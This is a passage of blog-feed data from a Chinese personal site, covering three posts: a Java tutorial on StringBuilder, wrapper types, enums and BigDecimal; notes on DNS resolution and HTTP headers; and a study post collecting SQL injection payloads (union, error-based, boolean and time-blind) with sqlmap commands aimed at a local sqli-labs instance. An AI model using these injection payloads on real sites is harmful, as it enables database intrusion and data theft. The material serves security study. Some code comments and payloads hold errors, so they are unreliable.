&#125; 定义的append()方法会返回this，这样，就可以不断调用自身的其他方法。 模仿StringBuilder设计一个可以不断增加的计数器： 1234567891011121314151617181920212223242526272829303132public class Main &#123; public static void main(String[] args) &#123; Adder adder = new Adder(); adder.add(2) .add(5) .inc() .add(10); System.out.println(adder.value()) &#125;&#125;class Adder &#123; private int sum = 0; public Adder add(int n) &#123; sum += n; return this; &#125; public Adder inc() &#123; sum ++; return this; &#125; public int value() &#123; return sum; &#125;&#125;// 输出// 18 练习 请使用StringBuilder构造一个INSERTSQL语句： 12345678910111213141516171819202122232425262728293031323334353637package com.itranswarp.learnjava;/** * Learn Java from https://www.liaoxuefeng.com/ * * @author liaoxuefeng */public class Main &#123; public static void main(String[] args) &#123; String[] fields = &#123; &quot;name&quot;, &quot;position&quot;, &quot;salary&quot; &#125;; String table = &quot;employee&quot;; String insert = buildInsertSql(table, fields); System.out.println(insert); System.out.println( &quot;INSERT INTO employee (name, position, salary) VALUES (?, ?, ?)&quot;.equals(insert) ? &quot;测试成功&quot; : &quot;测试失败&quot;); &#125; static String buildInsertSql(String table, String[] fields) &#123; // TODO: StringBuilder sb = new StringBuilder(&quot;INSERT INTO &quot;).append(table).append(&quot; (&quot;); for (String st: fields) &#123; sb.append(st).append(&quot;, &quot;); &#125; // 注意去掉最后的&quot;, &quot;: sb.delete(sb.length()-2, sb.length()).append(&quot;) VALUES (&quot;); for (String st : fields) &#123; sb.append(&quot;?, &quot;); &#125; sb.delete(sb.length()-2, sb.length()).append(&quot;)&quot;); return sb.toString(); &#125;&#125; StringJoiner 在上面的那个练习当中，我们需要, 来分割每个字段，可以直接使用StringJoiner对象来干这事。 12345678910111213141516import java.util.StringJoiner;public class Main &#123; public static void main(String[] args) &#123; String[] names = &#123;&quot;Bob&quot;, &quot;Alice&quot;, &quot;Grace&quot;&#125;; var sj = new StringJoiner(&quot;, &quot;); for (String name: names) &#123; sj.add(name); &#125; System.out.println(sj.toString()) &#125;&#125;// 输出// Bob, Alice, Grace 还可以指定“开头”和“结尾”： 12345678910111213141516import java.util.StringJoiner;public class Main &#123; public static void main(String[] args) &#123; String[] names = &#123;&quot;Bob&quot;, &quot;Alice&quot;, &quot;Grace&quot;&#125;; var sj = new StringJoiner(&quot;, &quot;, &quot;Hello&quot;, &quot;!&quot;); for (String name: names) &#123; sj.add(name); &#125; System.out.println(sj.toString()) &#125;&#125;// 输出// Hello Bob, Alice, Grace! 其实，String还提供了一个静态方法join()，这个方法在内部使用了StringJoiner来拼接字符串，在不需要指定“开头”和“结尾”的时候，用String.join()更方便： 123String[] names = &#123;&quot;Bob&quot;, &quot;Alice&quot;, &quot;Grace&quot;&#125;;var s = String.join(&quot;,&quot;, names); 练习 请使用StringJoiner构造一个SELECT语句： 12345678910111213141516171819202122232425262728package com.itranswarp.learnjava;import java.util.StringJoiner;/** * Learn Java from https://www.liaoxuefeng.com/ * * @author liaoxuefeng */public class Main &#123; public static void main(String[] args) &#123; String[] fields = &#123; &quot;name&quot;, &quot;position&quot;, &quot;salary&quot; &#125;; String table = &quot;employee&quot;; String select = buildSelectSql(table, fields); System.out.println(select); System.out.println(&quot;SELECT name, position, salary FROM employee&quot;.equals(select) ? &quot;测试成功&quot; : &quot;测试失败&quot;); &#125; static String buildSelectSql(String table, String[] fields) &#123; // TODO: var sj = new StringJoiner(&quot;, &quot;, &quot;SELECT &quot;, &quot; FROM &quot;+table); for (String field: fields) &#123; sj.add(field); &#125; return sj.toString(); &#125;&#125; 包装类型 Java为每种基本类型都提供了对应的包装类型： 基本类型 对应的引用类型 boolean java.lang.Boolean byte java.lang.Byte short java.lang.Short int java.lang.Integer long java.lang.Long float java.lang.Float double java.lang.Double char java.lang.Character 使用静态方法valueOf()创建Integer实例： 12345678public class Main &#123; public static void main(String[] args) &#123; int i = 100; Integer n1 = Integer.valueOf(i); Integer n2 = Integer.valueOf(&quot;100&quot;); &#125;&#125; 自动装箱和自动拆箱 Int和Integer可以相互转换： 1234int i = 100;Integer n = Integer.valueOf(i);int x = n.intValue(); 而Java编译器可以帮助我们自动在int和Integer直降相互转换： 123Integer n = 100;int x = n; 但是这样做可能会造成空指针异常的错误： 1234567public class Main &#123; public static void main(String[] args) &#123; Integer n = null; int i = n; &#125;&#125; 不变性 由于包装类型都属于引用类型，所以一旦创建了包装类型的对象，该对象就是不可变的。 和String类似，对于两个Integer实例进行比较必须使用equals()，而不能使用==。 进制转换 最常用的静态方法parseInt()可以把字符串解析成一个整数： 123int x1 = Integer.parseInt(&quot;100&quot;); // 100int x2 = Integer.parseInt(&quot;100&quot;, 16); // 255 Integer还可以把整数格式化为指定进制的字符串： 12345678910public class Main &#123; public static void main(String[] args) &#123; System.out.println(Integer.toString(100)); // &quot;100&quot; System.out.println(Integer.toString(100, 36)); // &quot;2s&quot; System.out.println(Integer.toHexString(100)); // &quot;255&quot; System.out.println(Integer.toOctalString(100)); // &quot;144&quot; System.out.println(Integer.toBinaryString(100)); // &quot;1100100&quot; &#125;&#125; 所有的整数和浮点数的包装类型都继承自Number，因此，可以非常方便地直接通过包装类型获取各种基本类型： 123456789//向上转型为NumberNumber num = new Integer(100);// 获取byte, int, long, float, double;byte b = num.byteValue();int i = num.intValue();long l = num.longValue();float f = num.floatValue();double d = num.doubleValue(); 无符号整型 123456789public class Main &#123; public static void main() &#123; byte x = -1; byte x = 127; System.out.println(Byte.toUnsignedInt(x)); // 255 System.out.println(Byte.toUnsignedInt(x)); // 127 &#125;&#125; JavaBean 定义 JavaBean是一种特殊但较为常见的class，它符合下列要求： 有若干个private实例字段； 通过public方法来读写实例字段； 且读写方法符合如下命名规范： 12345//读方法public Type getXyz()//写方法public void Type setXyz() 作用 JavaBean主要用来传递数据，即把一组数据组合成一个JavaBean便于传输 枚举JavaBean属性 要枚举一个JavaBean的所有属性，可以直接使用Java核心库提供的Introspector： 123456789101112131415161718192021222324252627282930313233343536373839404142434445public class Main &#123; public static void main(String[] args) throws Exception &#123; BeanInfo info = Introspector.getBeanInfo(Person.class); for (PropertyDescriptor pd : info.getPropertyDescriptors()) &#123; System.out.println(pd.getName()); System.out.println(&quot; &quot; + pd.getReadMethod()); System.out.println(&quot; &quot; + pd.getWriteMethod()); &#125; &#125;&#125;class Person &#123; private String name; private int age; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125;&#125;// 输出/**age public int Person.getAge() public void Person.setAge(int)class public final native java.lang.Class java.lang.Object.getClass() nullname public java.lang.String Person.getName() public void Person.setName(java.lang.String)**/ 枚举类 直接上🌰： 123456789101112131415public class Main &#123; public static void main() &#123; Weekday day = Weekday.SUN; if (day == Weekday.SUN || day == Weekday.SAT) &#123; System.out.println(&quot;Work at home&quot;); &#125; else &#123; System.out.println(&quot;Work an office!&quot;); &#125; &#125;&#125;enum Weekday &#123; SUN, MON, TUE, WED, THU, FRI, SAT;&#125; 与int类型的常量相比，使用enum定义枚举的优势有： enum常量本身带有类型信息，即Weekday.SUN的类型是Weekday； 不可能引用到非枚举的值； 不同类型的枚举不能相互比较或赋值。 enum的比较 enum是一个引用类型，前面提到引用类型进行比较必须使用equal()，因为==比较的是两个引用类型的变量是否是同一个对象。但enum类型可以例外，因为enum类型的每个常量在JVM中只有一个唯一实例。所以： 123day == Weekday.FRI //trueday.equals(Weekday.FRI) //true enum的方法 name() 返回常量名，例如： 12String s = Weekday.SUN.name() // &quot;SUN&quot; ordinal() 返回定义常量的顺序，例如 12int n = Weekday.SUN.ordinal() // 0 但是需要注意的是，改变枚举常量定义的顺序就会导致ordinal()返回值发生变化。 如果枚举类型要和int转换，处于程序的健壮性考虑，就不能依靠ordinal()的返回值。因为enum本身就是一个类，所以我们可以每个枚举常量增加一个字段，并定义private的构造方法。 123456789101112131415161718192021public class Main &#123; public static void main(String[] args) &#123; Weekday day = Weekday.SUN; if (day.dayValue == 6 || day.dayValue == 7)&#123; System.out.println(&quot;Work at home!&quot;); &#125; else &#123; System.out.println(&quot;Work at office!&quot;); &#125; &#125;&#125;enum Weekday &#123; MON(1), TUE(2), WED(3), THU(4), FRI(5), SAT(6), SUN(0); public final int dayValue; private Weekday(int dayValue)&#123; this.dayValue = dayValue; &#125;&#125; toString() 默认情况下，对枚举常量调用toString()会返回和name()一样的字符串。但是，toString()可以被覆写，而name()则不行。我们可以给Weekday添加toString()方法： 12345678910111213141516171819202122232425262728public class Main &#123; public static void main(String[] args) &#123; Weekday day = Weekday.SUN; if (day.dayValue == 6 || day.dayValue == 7)&#123; System.out.println(&quot;Today is &quot; + day + &quot;. Work at home!&quot;); &#125; else &#123; System.out.println(&quot;Today is &quot; + day + &quot;. Work at office!&quot;); &#125; &#125;&#125;enum Weekday &#123; MON(1, &quot;星期一&quot;), TUE(2, &quot;星期二&quot;), WED(3, &quot;星期三&quot;), THU(4, &quot;星期四&quot;), FRI(5, &quot;星期五&quot;), SAT(6, &quot;星期六&quot;), SUN(0, &quot;星期日&quot;); public final int dayValue; public final String chinese; private Weekday(int dayValue, String chinese)&#123; this.dayValue = dayValue; this.chinese = chinese; &#125; @Override public String toString() &#123; return this.chinese; &#125;&#125; Switch 12345678910111213141516171819202122232425public class Main &#123; public static void main(String[] args) &#123; Weekday day = Weekday.SUN; switch(day) &#123; case MON: case TUE: case WED: case THU: case FRI: System.out.println(&quot;Today is &quot; + day + &quot;. Work at office!&quot;); break; case SAT: case SUN: System.out.println(&quot;Today is &quot; + day + &quot;. Work at home!&quot;); break; default: throw new RuntimeException(&quot;cannot process &quot; + day); &#125; &#125;&#125;enum Weekday &#123; MON, TUE, WED, THU, FRI, SAT, SUN;&#125; BigInteger BigDecimal 定义 123BigDecimal bd = new BigDecimal(&quot;123.4567&quot;);System.out.println(bd.mutiply(bd)); // 15241.55677489 获取小数位数 1234567BigDecimal d1 = new BigDecimal(&quot;123.45&quot;);BigDecimal d2 = new BigDecimal(&quot;123.4500&quot;);BigDecimal d3 = new BigDecimal(&quot;1234500&quot;);System.out.println(d1.scale()); // 2,两位小数System.out.println(d2.scale()); // 4System.out.println(d3.scale()); // 0 剔除小数末尾0 12345678910BigDecimal d1 = new BigDecimal(&quot;123.4500&quot;);BigDecimal d2 = d1.stripTrailingZeros();System.out.println(d1.scale()); // 4System.out.println(d2.scale()); // 2,因为去掉了00BigDecimal d3 = new BigDecimal(&quot;1234500&quot;);BigDecimal d4 = d3.stripTrailingZeros();System.out.println(d3.scale()); // 0System.out.println(d4.scale()); // -2,表示这是一个整数，并且末尾有两个0 设置精度 1234567891011import java.math.BigDecimal;import java.math.RoundingMode;public class Main &#123; public static void main(String[] args) &#123; BigDecimal d1 = new BigDecimal(&quot;123.456789&quot;); BigDecimal d2 = d1.setScale(4, RoundingMode.HALF_UP); // 123.4568 四舍五入保留4位小数 BigDecimal d3 = d1.setScale(4, RoundingMode.DOWN); //123.4567 直接截断 &#125;&#125; 除法运算 对BigDecimal做加、减、乘时，精度不会丢失，但是做除法时，存在无法除尽的情况，这时，就必须指定精度以及如何进行截断： 1234BigDecimal d1 = new BigDecimal(&quot;123.456&quot;);BigDecimal d2 = new BigDecimal(&quot;23.456789&quot;);BigDecimal d3 = d1.divide(d2, 10, RoundingMode.HALF_UP); //保留10位小数并四舍五入 比较 在比较两个BigDecimal的值是否相等时，要特别注意，使用equals()方法不但要求两个BigDecimal的值相等，还要求它们的scale()相等： 123456BigDecimal d1 = new BigDecimal(&quot;123.456&quot;);BigDecimal d2 = new BigDecimal(&quot;123.45600&quot;);d1.equals(d2); // Falsed1.equals(d2.stripTrailingZeros()); // Trued1.compareTo(d2); //0 根据两个值的大小分别返回负数、正数和0，分别表示小于、大于和等于。 总是使用compareTo()比较两个BigDecimal的值，不要使用equals()！ 常用工具类 Math：数学计算 Random：生成伪随机数 要生成一个随机数，可以使用nextInt()、nextLong()、nextFloat()、nextDouble()： 1234567Random r = new Random();r.nextInt(); // 2071575453,每次都不一样r.nextInt(10); // 5,生成一个[0,10)之间的intr.nextLong(); // 8811649292570369305,每次都不一样r.nextFloat(); // 0.54335...生成一个[0,1)之间的floatr.nextDouble(); // 0.3716...生成一个[0,1)之间的double 如果我们在创建Random实例时指定一个种子，就会得到完全确定的随机数序列： 12345678910import java.util.Random;public class Main &#123; public static void main(String[] args) &#123; Random r = new Random(12345); for (int i = 0; i &lt; 10; i++) &#123; System.out.println(r.nextInt(100)); &#125; &#125;&#125; SecureRandom：生成安全的随机数","tags":[{"name":"java","slug":"java","permalink":"http://ca0y1h.top/tags/java/"}],"categories":[{"name":"编程","slug":"编程","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"},{"name":"java","slug":"编程/java","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/java/"}]},{"title":"Web安全学习之Web页面解析的流程学习","date":"2019-10-04T09:17:20.000Z","path":"Web_security/basic_learning/6.Web页面解析的流程学习/","text":"Web安全学习之Web页面解析的流程学习 任务目标 理解域名解析的整个流程； 理解Web页面请求的整个流程，绘制流程图（ngnix处理的11个过程）； 学习HTTP协议中的字段及含义； 学习HTTP请求方法以及返回状态码的类型和含义。 0x01 域名解析流程 这篇文章对于DNS讲的还比较透彻，在此基础做一点摘要。 域名层次结构 ) 域名服务器 ) 另外还有一个本地域名服务器：当一个主机发出DNS查询请求的时候，这个查询请求首先就是发给本地域名服务器的。 域名解析记录 A (Address) 记录：又称IP指向，用户可以在此设置⼦域名并指向到⾃⼰的⽬标主机地址上，从 而实现通过域名找到服务器。 CNAME记录：也被称为规范名字。这种记录允许您将多个名字映射到同⼀台计算机。 MX（Mail Exchanger）记录：邮件交换记录，它指向⼀个邮件服务器，⽤于电⼦邮件系统发邮 件时根据 收信⼈的地址后缀来定位邮件服务器。 NS(Name Server)记录：解析服务器记录。⽤来表明由哪台服务器对该域名进⾏解析。这⾥的NS 记录只对⼦域名⽣效。 TXT记录：⼀般指为某个主机名或域名设置的说明。 域名解析过程 以查询jocent.me为例，其中10.74.36.90为主机IP，10.74.1.11为本地DNS服务器： ①主机10.74.36.90先向本地域名服务器10.74.1.11进行递归查询 ②本地域名服务器采用迭代查询，向一个根域名服务器进行查询 ③根域名服务器告诉本地域名服务器，下一次应该查询的顶级域名服务器dns.me的IP地址 ④本地域名服务器向顶级域名服务器dns.me进行查询 ⑤顶级域名服务器me告诉本地域名服务器，下一步查询权限服务器dns.jocent.me的IP地址 ⑥本地域名服务器向权限服务器dns.jocent.me进行查询 ⑦权限服务器dns.jocent.me告诉本地域名服务器所查询的主机的IP地址 ⑧本地域名服务器最后把查询结果告诉 10.74.36.90 总的来说DNS解析过程如下图所示： 其中有两个概念递归查询和迭代查询: 递归查询：本机向本地域名服务器发出一次查询请求，就静待最终的结果。如果本地域名服务器无法解析，自己会以DNS客户机的身份向其它域名服务器查询，直到得到最终的IP地址告诉本机。 迭代查询：本地域名服务器向根域名服务器查询，根域名服务器告诉它下一步到哪里去查询，然后它再去查，每次它都是以客户机的身份去各个服务器查询。 0x02 Web页面请求流程 对Nginx知之甚少，关于Nginx的请求处理阶段先占个坑，留个比较全面的学习文档占个坑。 0x03 HTTP协议的字段及含义 HTTP请求报文 请求报文结构： 其中，值得关注的是HTTP报文头由方法、URI 、HTTP版本、HTTP首部字段等部分构成。 例如，请求hackr.jp网站的请求报文头如下所示： HTTP响应报文 响应报文结构： 例如，刚刚请求的hackr.jp的响应报文头如下所示： HTTP首部字段类型 通用首部字段（General Header Fields） 请求报文和响应报文两方都会使用的首部。 Cache-Control字段 通过指定首部字段 Cache-Control 的指令，就能操作缓存的工作机制。 缓存请求指令一览： 指令 Client Server no-cache 不接收缓存过的响应 不能对资源进行缓存 no-store 不缓存请求或响应的任何内容 不缓存请求或响应的任何内容 max-age = [秒] 接收缓存时间比max-age数值更小的资源 代表资源保存为缓存的最长时间 max-stale = [秒] 接收已过期的响应 min-fresh = [秒] 期望在指定时间内的响应仍有效 no-transform 代理不可更改媒体类型 only-if-cached 从缓存获取资源 cache-extension 新指令标记 **注意：**从字面意思上很容易把 no-cache 误解成为不缓存，但事实上 no-cache 代表不缓存过期的资源，缓存会向源服务器进行有效期确认后处理资源，也许称为 do-notserve-from-cache-without-revalidation 更合适，no-store 才是真正地不进行缓存。 Connection字段 具备两个作用： 控制不再转发给代理的首部字段 conneciton: upgrade表示Upgrade首部字段产生作用的Upgrade对象仅限于客户端和邻接服务器之间。 管理持久连接 HTTP/1.1 版本的默认连接都是持久连接。为此，客户端会在持久连接上连续发送请求。当服务器端想明确断开连接时，则指定 Connection 首部字段的值为 Close。 Date字段 首部字段 Date 表明创建 HTTP 报文的日期和时间。 Transfer-Encoding字段 首部字段 Transfer-Encoding 规定了传输报文主体时采用的编码方式。 Upgrade字段 首部字段 Upgrade 用于检测 HTTP 协议及其他协议是否可使用更高的 版本进行通信，其参数值可以用来指定一个完全不同的通信协议。 Via字段 使用首部字段 Via 是为了追踪客户端与服务器之间的请求和响应报文的传输路径。 请求首部字段（Request Header Fields） 从客户端向服务器端发送请求报文时使用的首部。补充了请求的附加内容、客户端信息、响应内容相关优先级等信息。 首部字段名 说明 Accept 用户理可处理的媒体类型 Accept-Charset 优先的字符集 Accept-Encoding 优先的内容编码 Accept-Language 优先的语言 Authorization Web认证信息 Expect 期待服务器的特定行为 From 用户的电子邮箱 Host 请求资源所在的服务器 If-Match 比较实体标志（ETag） If-None-Match 比较实体标志（ETag） If-Modified-Since 比较资源更新时间 If-Range 资源未更新时发送实体Byte的范围请求 If-Unmodified-Since 比较资源更新时间（与If-Modified-Since相反） Max-Forward 最大传输逐跳数 Proxy-Authorization 代理服务器要求客⼾端的认证信息 Referer 对请求中URI的原始获取方 TE 传输编码的优先级 User-Agent HTTP客户端程序信息 响应首部字段（Response Header Fields） 从服务器端向客户端返回响应报文时使用的首部。补充了响应的附加内容，也会要求客户端附加额外的内容信息。 首部字段 说明 Accept-Ranges 是否接受字段范围请求 Age 推算资源创建经过时间 ETag 资源匹配信息 Location 令客户端重定向至指定URI Proxy-Authenticate 代理服务器对客户端的认证信息 Retry-After 对再次发起请求的时机要求 Server HTTP服务器的安装信息 Vary 代理服务器缓存的管理信息 WWW-Authenticate 服务器对客户端的认证信息 实体首部字段（Entity Header Fields） 针对请求报文和响应报文的实体部分使用的首部。补充了资源内容更新时间等与实体有关的信息。 首部字段名 说明 Allow 可支持的HTTP方法 Content-Encoding 实体主体适用的编码方式 Content-Laguage 实体主英文名称体的自然语言 Content-Length 实体主体的大小 Content-Location 替代对应资源的URI Content-MD5 实体主体的摘要 Content-Type 实体主体的媒体类型 Content-Range 实体主体的位置范围 Expires 实体主体过期的日期时间 Last-Modied 资源最后修改的日期时间 0x04 HTTP请求方法及返回状态码的类型和含义 HTTP请求方法 HTTP请求方式分为GET 、POST 、PUT 、HEAD 、DELETE 、OPTIONS 、TRACE和CONNECT 八种。 GET：获取资源 GET 方法用来请求访问已被URI 识别的资源。指定的资源经服务器端解析后返回响应内容。也就是说，如果请求的资源是文本，那就保持原样返回；如果是像CGI（Common Gateway Interface，通用网关接口）那样的程序，则返回经过执行后的输出结果。例如： POST：传输实体主体 POST 方法用来传输实体的主体。 虽然用GET 方法也可以传输实体的主体，但⼀般不用GET 方法进行传输，而是用POST 方法。虽说POST 的功能与GET 很相似，但POST 的主要目的并不是获取响应的主体内容。例如： PUT：传输文件 PUT 方法用来传输文件。就像FTP协议的文件上传⼀样，要求请求报文的主题中包含文件内容，然后保存到请求URI的位置。但是，鉴于HTTP/1.1的PUT 方法自身不带验证机制，任何⼈都可以上传文件，存在安全性问题，因此⼀般的Web网站不使用该方法。例如： HEAD：获取报文首部 HEAD 方法和GET方法⼀样，只是不返回报文主体部分。勇于确认URI 的有效性及资源更新的日期时间等。例如： DELETE：删除文件 DELETE 方法用来删除文件，是与PUT 相反的方法。DELETE方法按请求URI 删除指定的资源。例如： OPTIONS：询问支持方法 OPTIONS方法用来查询针对请求URI 指定的资源支持的方法。例如： TRACE：追踪路径 TRACE方法是让 Web 服务器端将之前的请求通信环回给客户端的方法。 发送请求时,在 Max-Forwards 首部字段中填入数值,每经过一个服务器端就将该数字减 1 ,当数值刚好减到 0 时,就停止继续传输,最后接收到请求的服务器端则返回状态码 200 OK 的响应。 但是,TRACE 方法本来就不怎么常用,再加上它容易引发XST(Cross-Site Tracing,跨站追踪) 攻击,通常就更不会用到了。 CONNECT：隧道协议连接代理","tags":[{"name":"web安全基础","slug":"web安全基础","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"HTTP协议","slug":"HTTP协议","permalink":"http://ca0y1h.top/tags/HTTP%E5%8D%8F%E8%AE%AE/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"web安全/基础学习","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"Web安全学习之数据库注入语句的收集和学习","date":"2019-10-01T08:22:28.000Z","path":"Web_security/basic_learning/5.数据库注入语句的收集和学习/","text":"Web安全学习之数据库注入语句的收集和学习 任务目标 收集网络上各种sql注入时使用的payload并理解其适用的环境（检测注入、利用注入）； 记录sqlmap的检测和利用过程中使用的payload； 理解以上涉及的sql语句的意思，其中会涉及不同的数据库、不同注入场景。将收集方式和学习过程整理形成报告； 扩展学习：理解sqlmap自带tamper的原理 0x01 Payload收集 以下payloads都基于单引号字符型注入。若是整型注入则把单引号和注释符（–+）去掉，若是双引号注入则把单引号换成双引号。 我们把注入场景分为： 联合查询注入 报错型注入 布尔盲注 时间盲注 联合查询注入 使用场景 页面上有显示位 什么是显示位： 在一个在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数 据展示在页面中，这个展示数据的位置就叫显示位 。 Payload 判断当前数据表中有几列： 1?id&#x3D;1&#39; order by 数值 --+ 查看显示位在第几列（假设一共三列）： 1?id&#x3D;-1&#39; union select 1,2,3 --+ 注意：这里必须是查询一个不存在的记录才能起作用。 显示当前数据库（假设显示位中包含第三位）： 1?id&#x3D;-1&#39; union select 1,2,database() --+ 查看当前数据库中的所有表： 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) --+ 函数group_concat()把所有结果都在一行输出 查询所有数据库： 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schema) --+ 查询某个数据库中的表： 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; --+ 查询某个表中的所有字段： 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; --+ 查询某个表中的字段内容 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(name, 0x3a, passwd) from security.users) 0x3a会被转义位冒号： 报错型注入 使用场景 页面上没有显示位但是有sql语句执行错误信息输出。 Payload 主要有三种SQL注入报错方式： ExtractValue UpdateXml floor ExtractValue 首先来看ExtractValue()函数，它接受两个字符串参数，第一个参数可以传入目标xml文档，第二个参数是用Xpath路径法表示的查找路径。这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。 例如： 12mysql&gt; select ExtractValue(&#39;&lt;a&gt;&lt;b&gt;&lt;b&#x2F;&gt;&lt;&#x2F;a&gt;&#39;, &#39;~&#39;);ERROR 1105 (HY000): XPATH syntax error: &#39;~&#39; 利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。 12mysql&gt; select ExtractValue(&#39;&lt;a&gt;&lt;b&gt;&lt;b&#x2F;&gt;&lt;&#x2F;a&gt;&#39;, concat(&#39;~&#39;, (select database())));ERROR 1105 (HY000): XPATH syntax error: &#39;~security&#39; UpdateXml UpdateXML(xml_target, xpath_expr, new_xml) xml_target:： 需要操作的xml片段 xpath_expr： 需要更新的xml路径(Xpath格式) new_xml： 更新后的内容 不过这些参数都不太重要，这里和上面的extractvalue函数一样，当Xpath路径语法错误时，就会报错，报错内容含有错误的路径内容： 12345mysql&gt; select updatexml(&#39;test&#39;, concat(&#39;~&#39;, (select database())), &#39;test&#39;);ERROR 1105 (HY000): XPATH syntax error: &#39;~security&#39;mysql&gt; select updatexml(&#39;test&#39;, concat(&#39;~&#39;, (select version())), &#39;test&#39;);ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.27-0ubuntu0.18.0.1&#39; Floor 有关floor()函数的注入原理可以看这篇文章。 固定格式： 1?id&#x3D;-1&#39; union select 1, count(*), concat((******), floor(rand()*2))as a from information_schema.tables group by a --+ ******替换为查询语句即可。 查询数据库 1?id&#x3D;-1&#39; union select 1, count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a --+ 查询某个数据库中的表 1?id&#x3D;-1&#39; union select 1,count(*), concat((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 1, 1), floor(rand()*2)) as a from information_schema.columns group by a --+ 查询表中的字段 1?id&#x3D;-1&#39; union select 1, count(*), concat((select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;, limit 1,1), floor(rand()*2)) as a from information_schema.columns group by a --+ 查询表中的字段内容 1?id&#x3D;-1&#39; union select 1,count(*), concat((select concat_ws(&#39;|&#39;,username,password) from security.users limit 1,1), floor(rand()*2))as a from information_schema.tables group by a --+ 修改limit x,1 可以显示第x个用户的password和username。 布尔盲注 使用场景 页面没有显示位，也没有SQL语句执行错误信息，只能通过页面返回是否正常来判断注入点。 Payload 有用到二分法的思想 数据库名相关 查询数据库个数 1?id&#x3D;1&#39; union (select count(schema_name) from information_schema.schemata) &lt; 77 --+ 查询某一个数据库名的长度 1?id&#x3D;1&#39; union (select length(schema_name) from information_schema.schemata limit 1,1) &lt; 77 --+ 查询某个数据库名 1?id&#x3D;1&#39; union (select assii(substr(select schema_name from information_schema.schema limit 1,1)1,1)) &lt; 77 --+ 数据表相关 查询表的个数 1?id&#x3D;1&#39; union (select count(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;) &lt; 77 --+ 查询表的长度 1?id&#x3D;1&#39; union (select length(table_name) from information.schema.tables where table_schema&#x3D;&#39;security&#39;) &lt; 77 --+ 查看某个表名 1?id&#x3D;1&#39; union (select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 1,1),1,1))) &lt; 77 --+ 字段相关 查看某个表中的字段个数 1?id&#x3D;1&#39; union (select count(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;) &lt; 77 --+ 查看某个字段名的长度 1?id&#x3D;1&#39; union (select length(column_name) from infomation_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 1,1) &lt; 77 --+ 查看某个字段名 1?id&#x3D;1&#39; union (select ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 1,1),1,1))) &lt; 77 --+ 记录内容相关 查看表中行数 1?id&#x3D;1&#39; union (select count(*) from security.users) &lt; 77 --+ 查看某个字段内容的长度 1?id&#x3D;1&#39; union (select length(username) from security.users limit 1,1) &lt; 77 --+ 查看某个字段的内容 1?id&#x3D;1&#39; union (select ascii(substr((select username from security.users limit 1,1),1,1))) &lt; 77 --+ 时间盲注 使用场景 页面上没有显示位，也没有输出SQL语句执行错误信息。正确的SQL语句和错误的SQL语句返回页面都一样，但是加入sleep(5)条件之后，如果if条件成立则页面的返回速度明显慢了5秒。 Payload 与布尔盲注的思想类似 判断数据库的个数 1id&#x3D;1&#39; and if((select count(schema_name) from information_schema.schemata)&#x3D;9, sleep(5), 1) --+ 判断数据库名的长度 1id&#x3D;1&#39; and if((select length(schema_name) from information_schema.schemata)&#x3D;9, sleep(5), 1) --+ 查询数据库名 1id&#x3D;1&#39; and if((select ascii(substr((select schema_name from information_schema.schemata limit 0,1)1,1)))&#x3D;105, sleep(5), 1) --+ 0x02 SQLMap Payload 以sqlilab中的Less-8为例（布尔型单引号GET盲注），查看sqlmap中使用的payloads，执行命令： 1python sqlmap.py -v 3 -u &quot;http://localhost/sqlilabs/Less-8/?id=1&quot; --dbs --dbms=&quot;MySQL&quot; 首先获取数据库的个数：函数解释： ORD(string) ：返回字符串首字符的ASCII码值。 MID(string，start，length) ：返回字符串的从start开始长度为length的字符串。 IFNULL(string1，string2) ：如果string1是NULL则返回string2，如果不是NULL返回string1。 CAST(volume as type) 用于数据类型转换，将volume转换成type类型的数据（如这里是将数字转 换为字符串）。 COUNT()： 统计个数。 DISTINCT()： 标记只要不同（唯一）的值。 Payload解释： 0-9的字符ASCII值对应的是48-57，所以sqlmap首先判断的&gt;51也就是&gt;3，因为mysql本身就有六个数据库但world、test、sakila这三个数据库没什么用可以删除，那么最少应该有三个数据库，performance_schema和information_schema和mysql。 假如数据库的数量是&gt;3的话，那么就相当于1' and true返回页面不会出现问题，如果返回页面不是正确页面的话我们就可以确定一共有三个数据库（都是默认的）或者是由10多个数据库（20多个也是有可能的），十位是1,2总之是小于等于3的。 再获取每个数据库名（这里也mysql为例）： 其实道理和上述的一样进行猜解，通过判断每一位的ASCII码值来确定每个字母。 再以sqlilab中的Less-4为例（基于错误的GET双引号字符型注入），查看sqlmap中使用的payloads，执行命令： 1python sqlmap.py -v 3 -u &quot;http://localhost/sqlilabs/Less-4/?id=1&quot; --level 4 --dbs --dbms=&quot;MySQL&quot; SQLMap执行的payload如下所示： 0x03 SQLMap Tamper 